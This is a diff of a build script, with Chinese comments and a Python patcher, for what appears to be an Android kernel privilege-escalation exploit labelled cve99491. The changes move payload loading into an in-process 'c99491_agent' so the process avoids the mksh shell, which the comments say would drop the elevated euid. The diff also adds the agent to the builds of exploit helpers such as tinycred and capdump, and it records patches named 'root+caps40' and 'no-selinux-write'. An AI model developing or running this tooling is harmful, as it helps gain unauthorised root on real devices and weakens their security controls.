@@ -131,13 +131,13 @@ src, n = re.subn(
 if n != 2:
     raise SystemExit("补丁失败：initialized 写期望 2 次，实际 %d 次" % n)
 
-# 5) 装载方式：手工符号表 -> 直接跑我们的静态 runner
-#    不能经 sh：mksh 在 euid != uid 时会 setuid(getuid()) 把 euid 降回去。
+# 5) 装载方式：不再让 agent 走 loadksu（需要一加的符号表），
+#    也不经 shell（mksh 会降 euid）。改为进程内由 c99491_agent 自己加载。
 src = sub_n(
     src,
     "        int n = snprintf(c, sizeof(c), \"loadksu %#llx allow_shell=1\\n\", slide);",
-    "        int n = snprintf(c, sizeof(c), \"run /data/local/tmp/c99491_run\\n\");",
-    "loadksu -> run c99491_run",
+    "        int n = snprintf(c, sizeof(c), \"id\\n\");",
+    "loadksu -> id（真正的加载在 c99491_agent 里原地完成）",
     2,
 )
 
@@ -151,7 +151,7 @@ src = sub_n(
 )
 
 io.open(path, "w", encoding="utf-8").write(src)
-print("策略补丁已应用：root+caps(40轮) / 不写 selinux_state / 跑 c99491_run")
+print("策略补丁已应用：root+caps(40轮) / 不写 selinux_state / 进程内加载")
 PY
 
 # —— Android system_properties 垫片 ——
@@ -195,15 +195,16 @@ build() {
   ls -l "$OUT/$name"
 }
 
-build site_probe "$ROOT/plant/cve99491/site_probe.c"
-build c99491_run "$ROOT/plant/cve99491/c99491_run.c"
-build wtest      "$T/wtest.c"
-build ctest      "$T/ctest.c"
-build agent      "$T/agent.c"
-build capdump    "$T/capdump.c"
-build evread     "$T/evread.c"
-build hold       "$T/hold.c"
-build tinycred   "$T/tinycred.c"
+build site_probe    "$ROOT/plant/cve99491/site_probe.c"
+build c99491_run    "$ROOT/plant/cve99491/c99491_run.c"
+build c99491_agent  "$ROOT/plant/cve99491/c99491_agent.c"
+build wtest         "$T/wtest.c"
+build ctest         "$T/ctest.c"
+build agent         "$T/agent.c"
+build capdump       "$T/capdump.c"
+build evread        "$T/evread.c"
+build hold          "$T/hold.c"
+build tinycred      "$T/tinycred.c"
 
 {
   echo "upstream=$REPO@$COMMIT"
@@ -213,7 +214,7 @@ build tinycred   "$T/tinycred.c"
   echo "cred_site_low21=$CRED_SITE"
   echo "blob_site_a=$BLOB_A"
   echo "blob_site_b=$BLOB_B"
-  echo "patches=root+caps40,patch_agent40,no-selinux-write,c99491_run"
+  echo "patches=root+caps40,patch_agent40,no-selinux-write,inprocess-finit"
   echo "built_at=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
   for f in "$OUT"/*; do
     case "$f" in *.b64|*.txt) continue;; esac
